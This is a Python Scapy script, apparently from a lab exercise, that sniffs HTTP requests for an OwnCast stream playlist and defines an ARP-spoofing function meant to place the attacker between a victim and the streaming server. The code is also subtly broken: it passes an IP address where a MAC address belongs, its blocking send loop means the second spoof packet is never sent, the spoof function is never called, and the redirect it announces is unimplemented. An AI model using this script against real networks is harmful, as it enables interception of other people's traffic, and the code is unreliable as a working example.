from scapy.all import *
from scapy.layers.http import *
import sys
import argparse
import time
from scapy.layers.l2 import *

parser = argparse.ArgumentParser(description="OwnCast Packet Interceptor")
parser.add_argument("-dst", default="191.168.56.103") # Original OwnCast server
parser.add_argument("-port", default="8080") # Port of original OwnCast server
parser.add_argument("-fake", default="") # IP of new OwnCast server
parser.add_argument("-fake_port", default="") # Port of new OwnCast server
args = parser.parse_args()

host = args.dst
port = args.port
fake = args.fake
fake_port = args.fake_port

# By default we use the destination (the real owncast) as the fake host but assume the port is different, this is true in our testing model
if fake == "":
    fake = host
if fake_port == "":
    fake_port = port

# Patch for HTTP layers on ports other than port 80
print(f"Binding port {port} as an HTTP connection port")
bind_layers(TCP, HTTP, dport=int(port))
bind_layers(TCP, HTTP, sport=int(port))


# QUESTION: Define redirecting? ScaPy an only sniff
print(f"Redirecting stream on {host}:{port} to {fake}:{fake_port}")


# Function to print packets
def print_pkt(pkt):
    # Filter only HTTP requests
    if not pkt.haslayer(HTTPRequest):
        return

    http = pkt[HTTPRequest]
    path = http.Path.decode()
    print(f"Got packet with path {path}")

    # Filter HTTP requests for stream.m3u8
    if not 'stream.m3u8' in path:
        return

    pkt.show()


# Function to initiate an ARP attack
def init_arp(ip_victim, ip_server):
    # Lookup local MAC
    local_mac = get_if_addr(conf.iface)

    # Lookup victim MAC
    mac_victim = getmacbyip(ip_victim)

    # Lookup server MAC
    mac_server = getmacbyip(ip_server)

    # Prepare ARP packets
    # tell victim that we are server
    arp = Ether() / ARP()
    arp[Ether].src = local_mac
    arp[ARP].hwsrc = local_mac
    arp[ARP].psrc = ip_server
    arp[ARP].hwdst = mac_victim
    arp[ARP].pdst = ip_victim

    # tell 102 that we are 101
    arp2 = Ether() / ARP()
    arp2[Ether].src = local_mac
    arp2[ARP].hwsrc = local_mac
    arp2[ARP].psrc = ip_victim
    arp2[ARP].hwdst = mac_server
    arp2[ARP].pdst = ip_server

    # Set repeating ARP injection
    sendp(arp, iface=conf.iface, loop=1, inter=2)  # send every 2 seconds
    sendp(arp2, iface=conf.iface, loop=1, inter=2)  # send every 2 seconds


filter = "dst host " + host + " and dst port " + port
print(f"Filtering packets on {filter}")
pkt = sniff(filter=filter, prn=print_pkt)